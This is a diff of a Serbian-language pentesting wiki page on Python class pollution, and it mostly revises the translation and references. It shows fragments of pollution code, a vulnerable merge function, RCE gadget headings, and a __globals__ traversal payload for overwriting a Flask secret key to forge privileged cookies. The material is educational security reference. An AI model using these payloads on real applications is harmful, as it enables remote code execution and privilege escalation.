@@ -1,10 +1,10 @@
-# Zagađenje Klasa (Pythonovo Zagađenje Prototipa)
+# Class Pollution (Python's Prototype Pollution)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Osnovni Primer
+## Osnovni primer
 
-Proverite kako je moguće zagađivati klase objekata sa stringovima:
+Pogledajte kako je moguće zagaditi klase objekata pomoću stringova:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Osnovni Primer Ranljivosti
+## Osnovni primer ranjivosti
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Gadget Examples
+## Primeri gadgeta
 
 <details>
 
-<summary>Postavljanje podrazumevane vrednosti svojstva klase na RCE (subprocess)</summary>
+<summary>Kreiranje podrazumevane vrednosti svojstva klase za RCE (subprocess)</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Zagađivanje drugih klasa i globalnih varijabli putem <code>globals</code></summary>
+<summary>Zagađivanje drugih klasa i globalnih promenljivih putem <code>globals</code></summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Izvršenje proizvoljnih podprocesa</summary>
+<summary>Proizvoljno izvršavanje podprocesa</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -182,7 +182,7 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <summary>Prepisivanje <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** je posebna atribut svih funkcija, zasnovan na Python [dokumentaciji](https://docs.python.org/3/library/inspect.html), to je “mapiranje svih podrazumevanih vrednosti za **samo-ključeve** parametre”. Zagađivanje ovog atributa nam omogućava da kontrolišemo podrazumevane vrednosti parametara samo-ključeva funkcije, to su parametri funkcije koji dolaze posle \* ili \*args.
+**`__kwdefaults__`** je specijalan atribut svih funkcija; prema Python [dokumentaciji](https://docs.python.org/3/library/inspect.html), predstavlja „mapiranje svih podrazumevanih vrednosti za **keyword-only** parametre“. Polluting ovog atributa omogućava nam da kontrolišemo podrazumevane vrednosti **keyword-only** parametara funkcije; to su parametri funkcije koji dolaze nakon \* ili \*args.<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,25 +223,26 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Prepisivanje Flask tajne kroz fajlove</summary>
+<summary>Overwriting Flask secret across files</summary>
 
-Dakle, ako možete da izvršite class pollution nad objektom definisanim u glavnom python fajlu veba, ali **čija je klasa definisana u drugom fajlu** od glavnog. Zato što da biste pristupili \_\_globals\_\_ u prethodnim payload-ima, morate pristupiti klasi objekta ili metodama klase, moći ćete da **pristupite globals u tom fajlu, ali ne i u glavnom**. \
-Stoga, **nećete moći da pristupite globalnom objektu Flask aplikacije** koji je definisao **tajni ključ** na glavnoj stranici:
+Dakle, ako možete da izvršite class pollution nad objektom definisanim u glavnom python fajlu web aplikacije, ali čija je klasa definisana u drugom fajlu, a ne u glavnom. Pošto je za pristup \_\_globals\_\_ u prethodnim payload-ima potrebno da pristupite klasi objekta ili metodama klase, moći ćete da **pristupite globals u tom fajlu, ali ne i u glavnom fajlu**. \
+Zato **nećete moći da pristupite Flask app globalnom objektu** koji je definisao **secret key** na glavnoj stranici:<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-U ovom scenariju vam je potreban uređaj da pretražujete fajlove kako biste došli do glavnog da **pristupite globalnom objektu `app.secret_key`** kako biste promenili Flask tajni ključ i mogli da [**povećate privilegije** znajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+U ovom scenariju potreban vam je gadget za prolazak kroz fajlove kako biste došli do glavnog i **pristupili globalnom objektu `app.secret_key`**, promenili Flask secret key i mogli da [**eskalirate privilegije** poznavajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Payload poput ovog [iz ovog izveštaja](https://ctftime.org/writeup/36082):
+Payload poput ovog [iz ovog writeup-a](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Iskoristite ovaj payload da **promenite `app.secret_key`** (ime u vašoj aplikaciji može biti drugačije) kako biste mogli da potpisujete nove i privilegovanije flask kolačiće.
+Koristite ovaj payload da **promenite `app.secret_key`** (ime u vašoj aplikaciji može biti drugačije) kako biste mogli da potpisujete nove flask cookies sa većim privilegijama.
 
 </details>
 
-Proverite takođe sledeću stranicu za više read only gadgets:
+Pogledajte i sledeću stranicu za još read only gadgets:
+
 
 {{#ref}}
 python-internal-read-gadgets.md
@@ -249,6 +250,7 @@ python-internal-read-gadgets.md
 
 ## Reference
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
